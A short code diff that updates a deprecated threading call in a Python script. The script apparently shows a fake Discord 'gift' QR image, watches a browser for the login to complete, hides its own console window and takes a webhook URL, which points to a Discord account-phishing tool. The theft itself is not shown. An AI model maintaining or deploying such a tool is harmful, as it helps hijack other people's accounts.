@@ -98,7 +98,7 @@ def main(webhook_url: str) -> None:
         ctypes.windll.kernel32.GetConsoleWindow(), 0)
     def timer_killer(q, e):
         while True:
-            if e.isSet() != True:
+            if e.is_set() != True:
                 if discord_login != main.driver.current_url:
                     try:
                         os.remove('discord_gift.png')
@@ -206,4 +206,3 @@ if __name__ == "__main__":
     while th_main.is_alive():
         time.sleep(SLEEP_TIME)
     pystray_icon.icon.stop()
-
